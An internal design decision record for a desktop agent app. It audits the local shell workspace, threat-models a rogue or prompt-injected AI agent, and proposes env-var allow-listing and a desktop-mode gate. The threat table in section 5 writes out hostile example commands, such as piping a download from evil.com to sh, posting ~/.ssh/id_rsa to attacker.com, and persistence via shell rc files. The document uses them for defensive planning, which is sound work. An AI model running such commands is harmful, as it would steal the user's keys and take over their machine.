# Agent Execution Scope Decision

**Workpackage:** N3
**Date:** 2026-05-11
**Decision:** Option (a) — Ship with `LocalWorkspaceAdapter` + desktop-mode gate

---

## 1. Decision

Ship v1 desktop with `LocalWorkspaceAdapter` and a desktop-mode gate. The gate replaces the current `NODE_ENV === "production"` guard with a positive opt-in for desktop deployments via `HYPERIDLE_DESKTOP_MODE=true`. Two mitigations are required: env sandboxing in `LocalWorkspaceAdapter.exec()` and the desktop-mode gate itself.

---

## 2. Context

The concept review (Finding 1) identified that `provisionSession` — the 11-phase session lifecycle — is fully functional and well-tested but has zero production call sites. The session CRUD routes do bare DB inserts with no workspace spawn or harness start. The harness architecture cleanly separates two adapter interfaces (`WorkspaceAdapter` for the execution sandbox, `HarnessAdapter` for the AI runtime), but neither is wired into the server boot path.

This decision determines whether v1 desktop ships with agent execution (and which workspace surface to use), or defers it.

---

## 3. Evidence from Spike

The spike (`plans/N3/spike/run-spike.ts`) wired `LocalWorkspaceAdapter` + two different `HarnessAdapter` implementations through `provisionSession` in a standalone script. Results in `plans/N3/spike/results.txt`.

**Phase B — MockHarnessAdapter + LocalWorkspaceAdapter:**
- `provisionSession` completed: `outcome: "completed"`, `session.state: "done"`
- Session row persisted in DB with cost tracking (`session.cost: 0`)
- Workspace directory created and cleaned up on completion

**Phase C — StubHarnessAdapter swap:**
- Swapped `MockHarnessAdapter` for `StubHarnessAdapter` (a trivial second implementation)
- Same `LocalWorkspaceAdapter`, same provisioning path
- Result: `outcome: "completed"` — identical lifecycle behavior
- The swap required changing one assignment — no workspace-layer or DB-layer modifications
- Both adapters emit a `read_file` tool_call for an unregistered tool. `provisionSession` handles this gracefully (returns error result, does not crash the session). This was better than the architecture's prediction of `outcome: "crashed"`.

**Phase D — ClaudeAgentSdkAdapter:**
- Skipped: `ANTHROPIC_API_KEY` not set in spike environment
- This is a vendor-specific smoke test, not part of the harness-agnostic proof

**Conclusion:** The adapter abstraction holds. `provisionSession` operates entirely through the two interfaces. Adding a new harness adapter requires implementing 4 methods and changing one instantiation line.

---

## 4. Surface Audit

### Binaries

| Binary | Source | Invocation |
|--------|--------|------------|
| `sh` | `local-workspace-adapter.ts:24-48` | `child_process.spawn("sh", ["-c", command], { cwd })` |

No other binaries are invoked by the workspace adapter. The harness adapter may spawn vendor-specific processes (the Claude SDK runs in-process as a Node library, not as a subprocess).

### Filesystem regions

- **Workspace directory:** `{workspaceBasePath}/{workspaceId}/` — one directory per session
  - Created by `workspace.spawn(baseDir)` via `mkdir({ recursive: true })`
  - Destroyed by `workspace.destroy(handle)` via `rm({ recursive: true, force: true })`
- **Knowledge materialization:** `workspace/.fabric/` (manifest) + `knowledge/` (items) — written by `@hyperidle/fabric`'s `materialize()`
- **File watcher:** `startWatcher()` watches the workspace directory recursively via `fs.watch`
- **No path restrictions:** `LocalWorkspaceAdapter.exec()` sets `cwd` to the workspace directory, but `sh -c` commands can navigate the entire host filesystem via absolute paths

### Environment variables

| Context | Env behavior |
|---------|-------------|
| `ClaudeAgentSdkAdapter` | Allow-list: `PATH`, `HOME`, `LANG`, `ANTHROPIC_API_KEY`. All other vars blocked. Source: `claude-agent-sdk-adapter.ts:29` |
| `LocalWorkspaceAdapter.exec()` | Inherits full `process.env` via `sh -c`. **No sandbox.** `HYPERIDLE_API_KEY`, `DATABASE_URL`, and all process secrets are accessible. |

The harness adapter's env sandboxing protects only the harness SDK process. The workspace shell environment is unsandboxed — this is the primary gap requiring mitigation (see section 6).

### Network calls

| Component | Network behavior |
|-----------|-----------------|
| `LocalWorkspaceAdapter` | None — pure filesystem + process execution |
| `ClaudeAgentSdkAdapter` | HTTPS to `api.anthropic.com` via `@anthropic-ai/claude-agent-sdk` |
| `materialize()` + watcher | None — SQLite + host filesystem only |
| Workspace shell | Unrestricted — same as user's terminal. `curl`, `wget`, etc. are available if installed. |

---

## 5. Threat Model

### Scope

The threat model covers the **workspace surface** — the execution sandbox where agent-issued commands run. It does NOT cover the harness vendor's API security, the agent's LLM behavior (prompt injection, jailbreaks), or the server's auth model (covered by N2).

### Threat agents

- **The user:** Sole operator. Installs the app, provides API keys, initiates sessions.
- **The AI agent:** Executes commands within the workspace. Untrusted principal — may attempt to exceed workspace boundaries due to hallucination, adversarial prompt injection via ingested content, or emergent goal-seeking behavior.
- **Ingested content:** Files the agent reads from the knowledge base or workspace may contain adversarial instructions.

### Threats

| ID | Threat | Mechanism | Severity | Likelihood |
|----|--------|-----------|----------|------------|
| T1 | Workspace escape (read) | Agent executes `cat /etc/passwd` or `ls ~` via `exec()`. `sh -c` runs with full filesystem permissions. | HIGH | HIGH |
| T2 | Workspace escape (write) | Agent executes `echo "x" > ~/Documents/file.txt`. Same mechanism as T1. | HIGH | MEDIUM |
| T3 | Arbitrary binary execution | Agent executes `curl evil.com/payload \| sh`. Any binary on `PATH` is accessible. Elevated risk for bring-your-own harness adapters without guardrails. | HIGH | LOW-MEDIUM |
| T4 | Env var exfiltration | Agent reads env vars via `env` or `printenv`. `LocalWorkspaceAdapter.exec()` inherits full `process.env`. | MEDIUM | HIGH |
| T5 | Data exfiltration via network | Agent runs `curl https://attacker.com -d @~/.ssh/id_rsa`. Full network access. | HIGH | LOW |
| T6 | Resource exhaustion | Fork bomb, disk fill, CPU exhaustion. | MEDIUM | LOW |
| T7 | Persistence | Agent writes to `~/.zshrc`, `~/Library/LaunchAgents/`, crontab. | HIGH | VERY LOW |

### Critical finding: T4 env var leak

`ClaudeAgentSdkAdapter` sandboxes env vars passed to the SDK (only `PATH`, `HOME`, `LANG`, `ANTHROPIC_API_KEY`). But `LocalWorkspaceAdapter.exec()` runs `sh -c` via `child_process.spawn`, which inherits the parent process's full environment. This means:

- `HYPERIDLE_API_KEY` is accessible via `echo $HYPERIDLE_API_KEY`
- `DATABASE_URL` is accessible
- Any other secrets in the Electron process environment are accessible

**Mitigation required:** See section 6.

### Desktop context re-evaluation

The production gate was designed for multi-tenant servers where Agent A escaping its workspace can access Agent B's data. In the desktop context:

- **Single user** — no other user's data to access
- **User IS the operator** — they chose to run the agent, provided credentials, can see output
- **No privilege escalation** — agent runs with the user's own permissions

The risk is equivalent to running Claude Code, Cursor, Windsurf, or GitHub Copilot on the user's machine. All execute with the user's full permissions. The difference is that HyperIdle agents run more autonomously — the harness adapter's permission mode (`"default"` vs `"bypassPermissions"`) partially compensates by prompting for dangerous operations.

---

## 6. Mitigations

### Env sandboxing in `LocalWorkspaceAdapter.exec()`

The `runShell` function must pass an explicit `env` to `child_process.spawn` instead of inheriting `process.env`:

```ts
const WORKSPACE_ENV_ALLOWLIST = ["PATH", "HOME", "LANG", "TERM"] as const;

function buildWorkspaceEnv(): Record<string, string> {
  const env: Record<string, string> = {};
  for (const key of WORKSPACE_ENV_ALLOWLIST) {
    const value = process.env[key];
    if (value !== undefined) env[key] = value;
  }
  return env;
}

const child = spawnProcess("sh", ["-c", command], { cwd, env: buildWorkspaceEnv() });
```

This mirrors `ClaudeAgentSdkAdapter`'s allow-list pattern and ensures `HYPERIDLE_API_KEY`, `DATABASE_URL`, and other secrets are inaccessible in the workspace shell. Implementation ships in follow-up workpackage N3a.

### Desktop-mode gate

Replace the current guard:
```ts
// Current: local-workspace-adapter.ts:62
if (process.env.NODE_ENV === "production") {
  throw new Error("LocalWorkspaceAdapter is not allowed in production environments...");
}
```

With:
```ts
const isDesktopMode = process.env.HYPERIDLE_DESKTOP_MODE === "true";
const isProduction = process.env.NODE_ENV === "production";

if (isProduction && !isDesktopMode) {
  throw new Error(
    "LocalWorkspaceAdapter is not allowed in multi-tenant production environments. "
    + "Use DockerWorkspaceAdapter, or set HYPERIDLE_DESKTOP_MODE=true for single-user desktop."
  );
}
```

The Electron main process sets `HYPERIDLE_DESKTOP_MODE=true` before starting the server. VPS/cloud profiles never set this flag — the multi-tenant guard remains. An env var (not `process.versions.electron`) because the server may run under Node as a subprocess of Electron (N1 migration).

### Harness adapter permission mode

Claude SDK agents in `"default"` mode prompt for dangerous operations. `HYPERIDLE_UNSAFE_AGENT_MODE=true` bypasses these prompts. The default mode provides an additional layer of defense against rogue agent behavior beyond workspace-level mitigations.

---

## 7. Supported Harness Adapters

v1 supports **any `HarnessAdapter` implementation with a Node-library SDK** that the user provides credentials for.

Shipped implementations:
- `ClaudeAgentSdkAdapter` — uses `@anthropic-ai/claude-agent-sdk` as a Node library. Requires `ANTHROPIC_API_KEY`.

The interface supports Cursor, Codex, custom runtimes — implementors satisfy 4 methods. See section 8 for the extension point spec.

---

## 8. How New Harnesses Are Added

A harness adapter is a class implementing `HarnessAdapter` (defined in `packages/shared/src/harness/harness-adapter.ts`). Four methods:

1. **`startSession(config: SessionConfig): Promise<SessionHandle>`** — Initialize the AI session. `config` includes `workspacePath`, `soulPromptPath`, `modelTier`, `tools`.

2. **`streamEvents(handle: SessionHandle): AsyncIterable<HarnessEvent>`** — Yield events as the agent works. Six event types: `token_usage`, `tool_call`, `completion`, `error`, `cost_update`, `pre_compaction`. The provisioning loop handles all six generically. Omit `cost_update` if no cost reporting; omit `pre_compaction` if no compaction support.

3. **`stopSession(handle: SessionHandle): Promise<SessionResult>`** — Terminate and return structured cost + token usage. Return `{ outcome: "completed", cost: { minor: 0, currency: "USD" }, tokenUsage: { byTier: {} } }` if no cost/token tracking.

4. **`getCapabilities(): HarnessCapabilities`** — Declare support for `preCompactionTrigger` and `subAgents`.

**Where to put it:**
- `packages/server/src/harness/<vendor>-adapter.ts`
- Export from `packages/server/src/harness/index.ts`
- Constructor accepts API key env var name (configurable credential source)

**What you do NOT need to change:**
- `provisionSession` — takes `HarnessAdapter` as dependency, not a concrete class
- `WorkspaceAdapter` — workspace creation is independent of the harness
- Tool registry — tools are harness-agnostic
- Session routes — operate on DB rows, not the harness
- Event bus — events are typed generically

**What you DO need to add:**
- Entry in `packages/db/src/profiles.ts` if the harness needs a deployment-profile default
- Credential entry in Settings UI (harness-agnostic labels)
- Model-tier mapping if the harness uses model names

---

## 9. Reversibility

The decision is **architecturally reversible**: the desktop profile can switch to requiring Docker or implementing a lightweight sandbox (macOS Seatbelt, process limits) without changing the `HarnessAdapter` interface or the `provisionSession` flow. The workspace adapter swap is a one-assignment change.

However, **product-level reversibility has a cost**: once N3a ships desktop-mode gating and env sandboxing, and downstream workpackages (N4 Electron shell, N5 Settings UI with credential entry) build UX around agent execution, reverting to option (b) or (c) requires reworking those workpackages. The architectural swap is trivial; the product rollback is not.

---

## 10. Follow-Up Workpackage

**N3a — Agent execution wiring for desktop** has been added to `plans/work-packages/TRACK-N.md` and `plans/work-packages/pipeline-manifest.yaml`.

Scope:
- `LocalWorkspaceAdapter` constructor accepts desktop mode (env-gated)
- `runShell` uses sandboxed env (allow-list)
- `provisionSession` wired into server boot path via deployment profile
- Session CRUD route updated to optionally trigger `provisionSession`
- Settings UI includes harness credential entry (harness-agnostic labels)

Dependencies: N3, N4 (needs Electron shell to set `HYPERIDLE_DESKTOP_MODE`).
